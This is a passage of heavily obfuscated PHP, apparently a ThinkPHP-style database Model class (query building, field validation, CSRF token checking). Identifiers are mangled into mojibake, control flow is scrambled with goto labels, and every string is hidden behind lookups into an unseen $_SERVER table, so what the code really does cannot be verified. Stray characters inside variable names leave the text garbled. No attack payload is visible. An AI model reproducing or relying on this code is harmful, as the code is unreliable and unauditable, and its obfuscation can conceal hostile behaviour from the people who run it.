Cì©¯©š”å: $aß×ÔÄÒ£æ =& $_SERVER[‡’¶øåüç˜]; if (is_array($E¿œœß ˆ÷)) { $E¿œœß ˆ÷ = array_merge($this->options, $E¿œœß ˆ÷); } $this->options = array(); goto dà¤®ğƒ’Ù; dà¤®ğƒ’Ù: if (!isset($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[271]])) { $E¿œœß ˆ÷[$aß×ÔÄÒ£æ[271]] = $this->getTableName(); $D¢ÊŸã†÷¯ = $this->fields; } else { $D¢ÊŸã†÷¯ = $this->getDbFields(); } if (!empty($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[272]])) { $E¿œœß ˆ÷[$aß×ÔÄÒ£æ[271]] .= $aß×ÔÄÒ£æ[50] . $E¿œœß ˆ÷[$aß×ÔÄÒ£æ[272]]; } $E¿œœß ˆ÷[$aß×ÔÄÒ£æ[273]] = $this->name; goto Få˜•Ãƒ¼¶; Få˜•Ãƒ¼¶: if (isset($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[267]]) && is_array($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[267]]) && !empty($D¢ÊŸã†÷¯) && !isset($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[274]]) && !isset($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[271]])) { foreach ($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[267]] as $Eê„ÒÓß®„ => $Fãƒè³ÑÈ) { $Eê„ÒÓß®„ = trim($Eê„ÒÓß®„); if (in_array($Eê„ÒÓß®„, $D¢ÊŸã†÷¯, !0)) { if (is_scalar($Fãƒè³ÑÈ)) { $this->_parseType($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[267]], $Eê„ÒÓß®„); } } elseif (!is_numeric($Eê„ÒÓß®„) && $aß×ÔÄÒ£æ[70] != substr($Eê„ÒÓß®„, 0, 1) && !1 === strpos($Eê„ÒÓß®„, $aß×ÔÄÒ£æ[91]) && !1 === strpos($Eê„ÒÓß®„, $aß×ÔÄÒ£æ[252]) && !1 === strpos($Eê„ÒÓß®„, $aß×ÔÄÒ£æ[275]) && !1 === strpos($Eê„ÒÓß®„, $aß×ÔÄÒ£æ[276])) { unset($E¿œœß ˆ÷[$aß×ÔÄÒ£æ[267]][$Eê„ÒÓß®„]); } } } $this->_options_filter($E¿œœß ˆ÷); return $E¿œœß ˆ÷; goto bÉß‹Ü§Ÿ; bÉß‹Ü§Ÿ: } protected function _options_filter(&$B…´”¸Ù¸Í) { } protected function _parseType(&$C¾¤ŸÛæÁÛ, $B¢¡ˆ½™ó®) { $FôÁ……äà– =& $_SERVER[‡’¶øåüç˜]; if (empty($this->options[$FôÁ……äà–[277]][$FôÁ……äà–[4] . $B¢¡ˆ½™ó®])) { $DíïùÆ±øÂ = strtolower($this->fields[$FôÁ……äà–[244]][$B¢¡ˆ½™ó®]); if (!1 !== strpos($DíïùÆ±øÂ, $FôÁ……äà–[278])) { } elseif (!1 === strpos($DíïùÆ±øÂ, $FôÁ……äà–[279]) && !1 !== strpos($DíïùÆ±øÂ, $FôÁ……äà–[280])) { $C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®] = intval($C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®]); } elseif (!1 !== strpos($DíïùÆ±øÂ, $FôÁ……äà–[281]) || !1 !== strpos($DíïùÆ±øÂ, $FôÁ……äà–[282])) { $C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®] = floatval($C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®]); } elseif (!1 !== strpos($DíïùÆ±øÂ, $FôÁ……äà–[283])) { $C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®] = (bool) $C¾¤ŸÛæÁÛ[$B¢¡ˆ½™ó®]; } } } public function find($c´æâ™˜âœ = array()) { goto bø‰îÆò„; a‚Ú›á¿Œ: if (empty($a°áÚõÎà)) { return null; } $this->data = $a°áÚõÎà[0]; $this->_afterFind($this->data, $c´æâ™˜âœ); goto FŠ‘Ëµ‘•®; cô¿•Æò›: $c´æâ™˜âœ = $this->_parseOptions(); $a°áÚõÎà = $this->db->select($c´æâ™˜âœ); if (!1 === $a°áÚõÎà) { return !1; } goto a‚Ú›á¿Œ; FŠ‘Ëµ‘•®: if (!empty($this->options[$dÖÖøõŸö‹[285]])) { return $this->returnResult($this->data, $this->options[$dÖÖøõŸö‹[285]]); } return $this->data; goto DÒŠáĞÒ©; bø‰îÆò„: $dÖÖøõŸö‹ =& $_SERVER[‡’¶øåüç˜]; if (is_numeric($c´æâ™˜âœ) || is_string($c´æâ™˜âœ)) { $aÙ‹‡àõ[$this->getPk()] = intval($c´æâ™˜âœ); $this->options[$dÖÖøõŸö‹[267]] = $aÙ‹‡àõ; } $this->options[$dÖÖøõŸö‹[284]] = 1; goto cô¿•Æò›; DÒŠáĞÒ©: } protected function _afterFind(&$cè¬¹áÅŒÜ, $d½§‰·Ò³ô) { } protected function returnResult($bÏµ’Ù³ò, $açÉÅîææ = '') { $fÂ‘ø™£Ãõ =& $_SERVER[‡’¶øåüç˜]; if ($açÉÅîææ) { if (is_callable($açÉÅîææ)) { return call_user_func($açÉÅîææ, $bÏµ’Ù³ò); } switch (strtolower($açÉÅîææ)) { case $fÂ‘ø™£Ãõ[286]: return json_encode($bÏµ’Ù³ò); case $fÂ‘ø™£Ãõ[287]: return xml_encode($bÏµ’Ù³ò); } } return $bÏµ’Ù³ò; } public function parseFieldsMap($EëÀ­ìˆŠŸ, $D×¨èËÀÃ© = 1) { if (!empty($this->_map)) { foreach ($this->_map as $aÏŸô¤òºå => $aøùÀµº—à) { if ($D×¨èËÀÃ© == 1) { if (isset($EëÀ­ìˆŠŸ[$aøùÀµº—à])) { $EëÀ­ìˆŠŸ[$aÏŸô¤òºå] = $EëÀ­ìˆŠŸ[$aøùÀµº—à]; unset($EëÀ­ìˆŠŸ[$aøùÀµº—à]); } } else { if (isset($EëÀ­ìˆŠŸ[$aÏŸô¤òºå])) { $EëÀ­ìˆŠŸ[$aøùÀµº—à] = $EëÀ­ìˆŠŸ[$aÏŸô¤òºå]; unset($EëÀ­ìˆŠŸ[$aÏŸô¤òºå]); } } } } return $EëÀ­ìˆŠŸ; } public function setField($C¯ÅöÛ‡ÔÆ, $AóÔ±Çšƒ– = '') { if (is_array($C¯ÅöÛ‡ÔÆ)) { $DŠëÛ‚é‹Œ = $C¯ÅöÛ‡ÔÆ; } else { $DŠëÛ‚é‹Œ[$C¯ÅöÛ‡ÔÆ] = $AóÔ±Çšƒ–; } return $this->save($DŠëÛ‚é‹Œ); } public function setAdd($c‡õ¸ˆ÷ƒ, $Fï†õ³¡¸ˆ = 1) { $E‰ÙÌëÎƒ =& $_SERVER[‡’¶øåüç˜]; $FŸ¾çœÖ—Ğ = $c‡õ¸ˆ÷ƒ . $E‰ÙÌëÎƒ[288] . $Fï†õ³¡¸ˆ; if ($Fï†õ³¡¸ˆ < 0) { $FŸ¾çœÖ—Ğ = $c‡õ¸ˆ÷ƒ . $Fï†õ³¡¸ˆ; } return $this->setField($c‡õ¸ˆ÷ƒ, array($E‰ÙÌëÎƒ[289], $FŸ¾çœÖ—Ğ)); } public function getField($BÑÔÕˆĞ, $a¾½‚ßêŞø = null) { $C‹×¿Ğ¶ƒÆ =& $_SERVER[‡’¶øåüç˜]; $AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[265]] = $BÑÔÕˆĞ; $AÈğ™ïç™ = $this->_parseOptions($AÈğ™ïç™); $BÑÔÕˆĞ = trim($BÑÔÕˆĞ); if (strpos($BÑÔÕˆĞ, $C‹×¿Ğ¶ƒÆ[47])) { if (!isset($AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[284]])) { $AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[284]] = is_numeric($a¾½‚ßêŞø) ? $a¾½‚ßêŞø : $C‹×¿Ğ¶ƒÆ[33]; } $fâù¥á¢Òå = $this->db->select($AÈğ™ïç™); if (!empty($fâù¥á¢Òå)) { goto C¯ÃÌ‹ïÒŒ; F‹“î‡‹¾®: $bÂŒã‹½­ = array_shift($BÑÔÕˆĞ); $eõä­¢™Ñ² = array(); $f´¡ØÛÉÓ = count($B­ñ³¶«Ë); goto cƒõàÅá›Š; cƒõàÅá›Š: foreach ($fâù¥á¢Òå as $E²Ëµ©Á) { $F½À˜Ï–ö‘ = $E²Ëµ©Á[$f¶‚ô×¶]; if (2 == $f´¡ØÛÉÓ) { $eõä­¢™Ñ²[$F½À˜Ï–ö‘] = $E²Ëµ©Á[$bÂŒã‹½­]; } else { $eõä­¢™Ñ²[$F½À˜Ï–ö‘] = is_string($a¾½‚ßêŞø) ? implode($a¾½‚ßêŞø, $E²Ëµ©Á) : $E²Ëµ©Á; } } return $eõä­¢™Ñ²; goto e’‹‰ôôº ; C¯ÃÌ‹ïÒŒ: $B­ñ³¶«Ë = explode($C‹×¿Ğ¶ƒÆ[47], $BÑÔÕˆĞ); $BÑÔÕˆĞ = array_keys($fâù¥á¢Òå[0]); $f¶‚ô×¶ = array_shift($BÑÔÕˆĞ); goto F‹“î‡‹¾®; e’‹‰ôôº : } } else { if (!0 !== $a¾½‚ßêŞø) { $AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[284]] = is_numeric($a¾½‚ßêŞø) ? $a¾½‚ßêŞø : 1; } if ($a¾½‚ßêŞø === $C‹×¿Ğ¶ƒÆ[247]) { unset($AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[284]]); } $E²Ëµ©Á = $this->db->select($AÈğ™ïç™); if (!empty($E²Ëµ©Á)) { if ($a¾½‚ßêŞø === $C‹×¿Ğ¶ƒÆ[247]) { return reset($E²Ëµ©Á[0]); } if (!0 !== $a¾½‚ßêŞø && 1 == $AÈğ™ïç™[$C‹×¿Ğ¶ƒÆ[284]]) { return reset($E²Ëµ©Á[0]); } foreach ($E²Ëµ©Á as $a¾˜ƒãùâ) { $aÃ–»†©ÍÊ[] = $a¾˜ƒãùâ[$BÑÔÕˆĞ]; } return $aÃ–»†©ÍÊ; } } return null; } public function create($DšÄĞ«³Ì© = '', $dÇ‚°ÚˆÕ = '') { goto A‘÷‰‹Ü³ç; C–—Øƒ¢ö”: return $DšÄĞ«³Ì©; goto EŒ«‘÷; c£Ñ’Œ³Œë: $DšÄĞ«³Ì© = $this->parseFieldsMap($DšÄĞ«³Ì©, 0); $dÇ‚°ÚˆÕ = $dÇ‚°ÚˆÕ ? $dÇ‚°ÚˆÕ : (!empty($DšÄĞ«³Ì©[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$EÃšÅÄš™¸[265]])) { $bÓÉº•™¬‰ = $this->options[$EÃšÅÄš™¸[265]]; unset($this->options[$EÃšÅÄš™¸[265]]); } elseif ($dÇ‚°ÚˆÕ == THINK_MODEL_INSERT && isset($this->insertFields)) { $bÓÉº•™¬‰ = $this->insertFields; } elseif ($dÇ‚°ÚˆÕ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bÓÉº•™¬‰ = $this->updateFields; } goto E»‰¤ÇãŸ¬; dó¨è’àª: if ($this->autoCheckFields) { $bÓÉº•™¬‰ = $this->getDbFields(); foreach ($DšÄĞ«³Ì© as $cµèØÛğ÷î => $c¢Ø¢ö×ø) { if (!in_array($cµèØÛğ÷î, $bÓÉº•™¬‰)) { unset($DšÄĞ«³Ì©[$cµèØÛğ÷î]); } elseif (MAGIC_QUOTES_GPC && is_string($c¢Ø¢ö×ø)) { $DšÄĞ«³Ì©[$cµèØÛğ÷î] = stripslashes($c¢Ø¢ö×ø); } } } $this->autoOperation($DšÄĞ«³Ì©, $dÇ‚°ÚˆÕ); $this->data = $DšÄĞ«³Ì©; goto C–—Øƒ¢ö”; E»‰¤ÇãŸ¬: if (isset($bÓÉº•™¬‰)) { if (is_string($bÓÉº•™¬‰)) { $bÓÉº•™¬‰ = explode($EÃšÅÄš™¸[47], $bÓÉº•™¬‰); } if (think_config($EÃšÅÄš™¸[290])) { $bÓÉº•™¬‰[] = think_config($EÃšÅÄš™¸[291]); } foreach ($DšÄĞ«³Ì© as $cµèØÛğ÷î => $c¢Ø¢ö×ø) { if (!in_array($cµèØÛğ÷î, $bÓÉº•™¬‰)) { unset($DšÄĞ«³Ì©[$cµèØÛğ÷î]); } } } if (!$this->autoValidation($DšÄĞ«³Ì©, $dÇ‚°ÚˆÕ)) { return !1; } if (!$this->autoCheckToken($DšÄĞ«³Ì©)) { $this->error = think_lang($EÃšÅÄš™¸[292]); return !1; } goto dó¨è’àª; A‘÷‰‹Ü³ç: $EÃšÅÄš™¸ =& $_SERVER[‡’¶øåüç˜]; if (empty($DšÄĞ«³Ì©)) { $DšÄĞ«³Ì© = $_POST; } elseif (is_object($DšÄĞ«³Ì©)) { $DšÄĞ«³Ì© = get_object_vars($DšÄĞ«³Ì©); } if (empty($DšÄĞ«³Ì©) || !is_array($DšÄĞ«³Ì©)) { $this->error = think_lang($EÃšÅÄš™¸[263]); return !1; } goto c£Ñ’Œ³Œë; EŒ«‘÷: } public function autoCheckToken($A¾È÷‰ÒÅã) { $dâ‹Ä¾¢¤ =& $_SERVER[‡’¶øåüç˜]; if (isset($this->options[$dâ‹Ä¾¢¤[293]]) && !$this->options[$dâ‹Ä¾¢¤[293]]) { return !0; } if (think_config($dâ‹Ä¾¢¤[290])) { $aÜ‹ÇœŒÒí = think_config($dâ‹Ä¾¢¤[291]); if (!isset($A¾È÷‰ÒÅã[$aÜ‹ÇœŒÒí]) || Session::get($aÜ‹ÇœŒÒí)) { return !1; } list($fÌ­í„Õª›, $B†Ï¦ïàµ) = explode($dâ‹Ä¾¢¤[70], $A¾È÷‰ÒÅã[$aÜ‹ÇœŒÒí]); if ($B†Ï¦ïàµ && Session::get($aÜ‹ÇœŒÒí . $dâ‹Ä¾¢¤[91] . $fÌ­í„Õª›) === $B†Ï¦ïàµ) { Session::remove($aÜ‹ÇœŒÒí . $dâ‹Ä¾¢¤[91] . $fÌ­í„Õª›); return !0; } if (think_config($dâ‹Ä¾¢¤[294])) { Session::remove($aÜ‹ÇœŒÒí . $dâ‹Ä¾¢¤[91] . $fÌ­í„Õª›); } return !1; } return !0; } public function regex($c‰¹…’È˜ì, $cÏ™áé¨­) { $c–ö‰šİÌ =& $_SERVER[‡’¶øåüç˜]; $D¦½–ĞŞÉâ = array($c–ö‰šİÌ[295] => $c–ö‰šİÌ[296], $c–ö‰šİÌ[297] => $c–ö‰šİÌ[298], $c–ö‰šİÌ[299] => $c–ö‰šİÌ[300], $c–ö‰šİÌ[301] => $c–ö‰šİÌ[302], $c–ö‰šİÌ[303] => $c–ö‰šİÌ[304], $c–ö‰šİÌ[305] => $c–ö‰šİÌ[306], $c–ö‰šİÌ[307] => $c–ö‰šİÌ[308], $c–ö‰šİÌ[282] => $c–ö‰šİÌ[309], $c–ö‰šİÌ[310] => $c–ö‰šİÌ[311]); if (isset($D¦½–ĞŞÉâ[strtolower($cÏ™áé¨­)])) { $cÏ™áé¨­ = $D¦½–ĞŞÉâ[strtolower($cÏ™áé¨­)]; } return preg_match($cÏ™áé¨­, $c‰¹…’È˜ì) === 1; } private function autoOperation(&$Eé­ß–ì×â, $fîñùîÏ¢) { $d—Šï¹°« =& $_SERVER[‡’¶øåüç˜]; if (!empty($this->options[$d—Šï¹°«[312]])) { $C ½‘ºìöÜ = $this->options[$d—Šï¹°«[312]]; unset($this->options[$d—Šï¹°«[312]]); } elseif (!empty($this->_auto)) { $C ½‘ºìöÜ = $this->_auto; } if (isset($C ½‘ºìöÜ)) { foreach ($C ½‘ºìöÜ as $eÆ¯¹ñêÀÃ) { if (empty($eÆ¯¹ñêÀÃ[2])) { $eÆ¯¹ñêÀÃ[2] = THINK_MODEL_INSERT; } if ($fîñùîÏ¢ == $eÆ¯¹ñêÀÃ[2] || $eÆ¯¹ñêÀÃ[2] == THINK_MODEL_BOTH) { switch (trim($eÆ¯¹ñêÀÃ[3])) { case $d—Šï¹°«[313]: case $d—Šï¹°«[314]: $F¼š‡À¼£ = isset($eÆ¯¹ñêÀÃ[4]) ? (array) $eÆ¯¹ñêÀÃ[4] : array(); if (isset($Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]])) { array_unshift($F¼š‡À¼£, $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]]); } if ($d—Šï¹°«[313] == $eÆ¯¹ñêÀÃ[3]) { $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]] = call_user_func_array($eÆ¯¹ñêÀÃ[1], $F¼š‡À¼£); } else { $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]] = call_user_func_array(array(&$this, $eÆ¯¹ñêÀÃ[1]), $F¼š‡À¼£); } break; case $d—Šï¹°«[265]: $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]] = $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[1]]; break; case $d—Šï¹°«[315]: if ($d—Šï¹°«[33] === $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]]) { unset($Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]]); } break; case $d—Šï¹°«[316]: default: $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]] = $eÆ¯¹ñêÀÃ[1]; } if (!1 === $Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]]) { unset($Eé­ß–ì×â[$eÆ¯¹ñêÀÃ[0]]); } } } } return $Eé­ß–ì×â; } protected function autoValidation($AùÔ«†ÆË, $b· »¥ÕÜ·) { $dİâ´‘Ò°´ =& $_SERVER[‡’¶øåüç˜]; if (!empty($this->options[$dİâ´‘Ò°´[317]])) { $AßåŸ§±ˆâ = $this->options[$dİâ´‘Ò°´[317]]; unset($this->options[$dİâ´‘Ò°´[317]]); } elseif (!empty($this->_validate)) { $AßåŸ§±ˆâ = $this->_validate; } if (isset($AßåŸ§±ˆâ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AßåŸ§±ˆâ as $B†ªÏ–ä–™ => $EÌÚ¿Âƒ×Š) { if (empty($EÌÚ¿Âƒ×Š[5]) || $EÌÚ¿Âƒ×Š[5] == THINK_MODEL_BOTH || $EÌÚ¿Âƒ×Š[5] == $b· »¥ÕÜ·) { if (0 == strpos($EÌÚ¿Âƒ×Š[2], $dİâ´‘Ò°´[318]) && strpos($EÌÚ¿Âƒ×Š[2], $dİâ´‘Ò°´[319])) { $EÌÚ¿Âƒ×Š[2] = think_lang(substr($EÌÚ¿Âƒ×Š[2], 2, -1)); } $EÌÚ¿Âƒ×Š[3] = isset($EÌÚ¿Âƒ×Š[3]) ? $EÌÚ¿Âƒ×Š[3] : THINK_EXISTS_VALIDATE; $EÌÚ¿Âƒ×Š[4] = isset($EÌÚ¿Âƒ×Š[4]) ? $EÌÚ¿Âƒ×Š[4] : $dİâ´‘Ò°´[320]; switch ($EÌÚ¿Âƒ×Š[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($AùÔ«†ÆË, $EÌÚ¿Âƒ×Š)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($dİâ´‘Ò°´[33] != trim($AùÔ«†ÆË[$EÌÚ¿Âƒ×Š[0]])) { if (!1 === $this->_validationField($AùÔ«†ÆË, $EÌÚ¿Âƒ×Š)) { return !1; } } break; default: if (isset($AùÔ«†ÆË[$EÌÚ¿Âƒ×Š[0]])) { if (!1 === $this->_validationField($AùÔ«†ÆË, $EÌÚ¿Âƒ×Š)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($CÍ¬±÷‹½¦, $B¼ğ«ÍËê) { if (!1 === $this->_validationFieldItem($CÍ¬±÷‹½¦, $B¼ğ«ÍËê)) { if ($this->patchValidate) { $this->error[$B¼ğ«ÍËê[0]] = $B¼ğ«ÍËê[2]; } else { $this->error = $B¼ğ«ÍËê[2]; return !1; } } return; } protected function _validationFieldItem($aòñ¤“ÜÍä, $f«’”Ûé°¥) { $c‚Şö¤ãÎÏ =& $_SERVER[‡’¶øåüç˜]; switch (strtolower(trim($f«’”Ûé°¥[4]))) { case $c‚Şö¤ãÎÏ[313]: case $c‚Şö¤ãÎÏ[314]: $AÌ©Šà¶š = isset($f«’”Ûé°¥[6]) ? (array) $f«’”Ûé°¥[6] : array(); if (is_string($f«’”Ûé°¥[0]) && strpos($f«’”Ûé°¥[0], $c‚Şö¤ãÎÏ[47])) { $f«’”Ûé°¥[0] = explode($c‚Şö¤ãÎÏ[47], $f«’”Ûé°¥[0]); } if (is_array($f«’”Ûé°¥[0])) { foreach ($f«’”Ûé°¥[0] as $Aİà¡‚³×) { $BÉÜ¶°¾œ[$Aİà¡‚³×] = $aòñ¤“ÜÍä[$Aİà¡‚³×]; } array_unshift($AÌ©Šà¶š, $BÉÜ¶°¾œ); } else { array_unshift($AÌ©Šà¶š, $aòñ¤“ÜÍä[$f«’”Ûé°¥[0]]); } if ($c‚Şö¤ãÎÏ[313] == $f«’”Ûé°¥[4]) { return call_user_func_array($f«’”Ûé°¥[1], $AÌ©Šà¶š); } else { return call_user_func_array(array(&$this, $f«’”Ûé°¥[1]), $AÌ©Šà¶š); } case $c‚Şö¤ãÎÏ[321]: return $aòñ¤“ÜÍä[$f«’”Ûé°¥[0]] == $aòñ¤“ÜÍä[$f«’”Ûé°¥[1]]; case $c‚Şö¤ãÎÏ[322]: if (is_string($f«’”Ûé°¥[0]) && strpos($f«’”Ûé°¥[0], $c‚Şö¤ãÎÏ[47])) { $f«’”Ûé°¥[0] = explode($c‚Şö¤ãÎÏ[47], $f«’”Ûé°¥[0]); } $còË…í¸ = array(); if (is_array($f«’”Ûé°¥[0])) { foreach ($f«’”Ûé°¥[0] as $Aİà¡‚³×) { $còË…í¸[$Aİà¡‚³×] = $aòñ¤“ÜÍä[$Aİà¡‚³×]; } } else { $còË…í¸[$f«’”Ûé°¥[0]] = $aòñ¤“ÜÍä[$f«’”Ûé°¥[0]]; } if (!empty($aòñ¤“ÜÍä[$this->getPk()])) { $còË…í¸[$this->getPk()] = array($c‚Şö¤ãÎÏ[323], $aòñ¤“ÜÍä[$this->getPk()]); } if ($this->where($còË…í¸)->find()) { return !1; } return !0; default: return $this->check($aòñ¤“ÜÍä[$f«’”Ûé°¥[0]], $f«’”Ûé°¥[1], $f«’”Ûé°¥[4]); } } public function check($d§ÎÏÇ´¥, $aŒÏÁÆ«Øœ, $DïŸîçõ¬‰ = "\x72\x65\x67\145\x78") { $Aî³½öäò =& $_SERVER[‡’¶øåüç˜]; $DïŸîçõ¬‰ = strtolower(trim($DïŸîçõ¬‰)); switch ($DïŸîçõ¬‰) { case $Aî³½öäò[7]: case $Aî³½öäò[324]: $DÇô®Š—ì¯ = is_array($aŒÏÁÆ«Øœ) ? $aŒÏÁÆ«Øœ : explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ); return $DïŸîçõ¬‰ == $Aî³½öäò[7] ? in_array($d§ÎÏÇ´¥, $DÇô®Š—ì¯) : !in_array($d§ÎÏÇ´¥, $DÇô®Š—ì¯); case $Aî³½öäò[325]: case $Aî³½öäò[326]: if (is_array($aŒÏÁÆ«Øœ)) { $B’·˜í…½ = $aŒÏÁÆ«Øœ[0]; $d³êÕ÷¯ê¯ = $aŒÏÁÆ«Øœ[1]; } else { list($B’·˜í…½, $d³êÕ÷¯ê¯) = explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ); } return $DïŸîçõ¬‰ == $Aî³½öäò[325] ? $d§ÎÏÇ´¥ >= $B’·˜í…½ && $d§ÎÏÇ´¥ <= $d³êÕ÷¯ê¯ : $d§ÎÏÇ´¥ < $B’·˜í…½ || $d§ÎÏÇ´¥ > $d³êÕ÷¯ê¯; case $Aî³½öäò[327]: case $Aî³½öäò[328]: return $DïŸîçõ¬‰ == $Aî³½öäò[327] ? $d§ÎÏÇ´¥ == $aŒÏÁÆ«Øœ : $d§ÎÏÇ´¥ != $aŒÏÁÆ«Øœ; case $Aî³½öäò[329]: $dØÎ¯Ø•ğÁ = mb_strlen($d§ÎÏÇ´¥, $Aî³½öäò[330]); if (strpos($aŒÏÁÆ«Øœ, $Aî³½öäò[47])) { list($B’·˜í…½, $d³êÕ÷¯ê¯) = explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ); return $dØÎ¯Ø•ğÁ >= $B’·˜í…½ && $dØÎ¯Ø•ğÁ <= $d³êÕ÷¯ê¯; } else { return $dØÎ¯Ø•ğÁ == $aŒÏÁÆ«Øœ; } case $Aî³½öäò[331]: list($Eºèƒà¯å®, $DäÄ¶õôÚÌ) = explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ); if (!is_numeric($Eºèƒà¯å®)) { $Eºèƒà¯å® = strtotime($Eºèƒà¯å®); } if (!is_numeric($DäÄ¶õôÚÌ)) { $DäÄ¶õôÚÌ = strtotime($DäÄ¶õôÚÌ); } return NOW_TIME >= $Eºèƒà¯å® && NOW_TIME <= $DäÄ¶õôÚÌ; case $Aî³½öäò[332]: return in_array(get_client_ip(), explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ)); case $Aî³½öäò[333]: return !in_array(get_client_ip(), explode($Aî³½öäò[47], $aŒÏÁÆ«Øœ)); case $Aî³½öäò[320]: default: return $this->regex($d§ÎÏÇ´¥, $aŒÏÁÆ«Øœ); } } public function query($AİÒØ‡©Âš, $AÑ²Úë¾í› = false) { $B¡ì‘—›Ìæ =& $_SERVER[‡’¶øåüç˜]; if (!is_bool($AÑ²Úë¾í›) && !is_array($AÑ²Úë¾í›)) { $AÑ²Úë¾í› = func_get_args(); array_shift($AÑ²Úë¾í›); } $AİÒØ‡©Âš = str_replace(array($B¡ì‘—›Ìæ[221], $B¡ì‘—›Ìæ[334]), $B¡ì‘—›Ìæ[50], $AİÒØ‡©Âš); $AİÒØ‡©Âš = $this->parseSql($AİÒØ‡©Âš, $AÑ²Úë¾í›); return $this->db->query($AİÒØ‡©Âš); } public function execute($e•…õæ‹°ª, $cÛ‡ŒâÔ¸Á = false) { if (!is_bool($cÛ‡ŒâÔ¸Á) && !is_array($cÛ‡ŒâÔ¸Á)) { $cÛ‡ŒâÔ¸Á = func_get_args(); array_shift($cÛ‡ŒâÔ¸Á); } $e•…õæ‹°ª = $this->parseSql($e•…õæ‹°ª, $cÛ‡ŒâÔ¸Á); return $this->db->execute($e•…õæ‹°ª); } protected function parseSql($c”‰®ˆÏÚ–, $BÃˆˆ“é) { $e¯•æòÅªæ =& $_SERVER[‡’¶øåüç˜]; if (!0 === $BÃˆˆ“é) { $Bš¤ô¢³ = $this->_parseOptions(); $c”‰®ˆÏÚ– = $this->db->parseSql($c”‰®ˆÏÚ–, $Bš¤ô¢³); } elseif (is_array($BÃˆˆ“é)) { $BÃˆˆ“é = array_map(array($this->db, $e¯•æòÅªæ[335]), $BÃˆˆ“é); $c”‰®ˆÏÚ– = vsprintf($c”‰®ˆÏÚ–, $BÃˆˆ“é); } else { $c”‰®ˆÏÚ– = strtr($c”‰®ˆÏÚ–, array($e¯•æòÅªæ[336] => $this->getTableName(), $e¯•æòÅªæ[337] => think_config($e¯•æòÅªæ[236]))); } $this->db->setModel($this->name); return $c”‰®ˆÏÚ–; } public function db($EÍ³ëêé = '', $CÓ›™Î“ŠÍ = '', $a¥Ë±ÚîãÃ = array()) { goto B£ÔÏÖ‡; d¯íË¥Öóë: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A°‚Îï“¬±; B„ø—ï¯ : $AíùÁÚ÷Å·[$EÍ³ëêé] = $CÓ›™Î“ŠÍ; $this->db = $c×¡„·Ã™÷[$EÍ³ëêé]; $this->_after_db(); goto d¯íË¥Öóë; DÓÆ‚Æ¬é: static $c×¡„·Ã™÷ = array(); if (!isset($c×¡„·Ã™÷[$EÍ³ëêé]) || isset($c×¡„·Ã™÷[$EÍ³ëêé]) && $CÓ›™Î“ŠÍ && $AíùÁÚ÷Å·[$EÍ³ëêé] != $CÓ›™Î“ŠÍ) { if (!empty($CÓ›™Î“ŠÍ) && is_string($CÓ›™Î“ŠÍ) && !1 === strpos($CÓ›™Î“ŠÍ, $f‹ àŒ¿§[8])) { $CÓ›™Î“ŠÍ = think_config($CÓ›™Î“ŠÍ); } $c×¡„·Ã™÷[$EÍ³ëêé] = Db::getInstance($CÓ›™Î“ŠÍ); } elseif (NULL === $CÓ›™Î“ŠÍ) { $c×¡„·Ã™÷[$EÍ³ëêé]->close(); unset($c×¡„·Ã™÷[$EÍ³ëêé]); return; } if (!empty($a¥Ë±ÚîãÃ)) { if (is_string($a¥Ë±ÚîãÃ)) { parse_str($a¥Ë±ÚîãÃ, $a¥Ë±ÚîãÃ); } foreach ($a¥Ë±ÚîãÃ as $C‡ˆ×´Õ´Ù => $AœˆØÆÈŠÅ) { $this->setProperty($C‡ˆ×´Õ´Ù, $AœˆØÆÈŠÅ); } } goto B„ø—ï¯ ; B£ÔÏÖ‡: $f‹ àŒ¿§ =& $_SERVER[‡’¶øåüç˜]; if ($f‹ àŒ¿§[33] === $EÍ³ëêé && $this->db) { return $this->db; } static $AíùÁÚ÷Å· = array(); goto DÓÆ‚Æ¬é; A°‚Îï“¬±: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $d˜Ñ‚Ñ–½ = get_class($this); if ($d˜Ñ‚Ñ–½ == $_SERVER[‡’¶øåüç˜][338]) { return $this->name; } $this->name = substr($d˜Ñ‚Ñ–½, 0, -5); } return $this->name; } public function getTableName() { $Bğù”„¾ğ =& $_SERVER[‡’¶øåüç˜]; if (empty($this->trueTableName)) { $AŒ“—¿Ø¸à = !empty($this->tablePrefix) ? $this->tablePrefix : $Bğù”„¾ğ[33]; if (!empty($this->tableName)) { 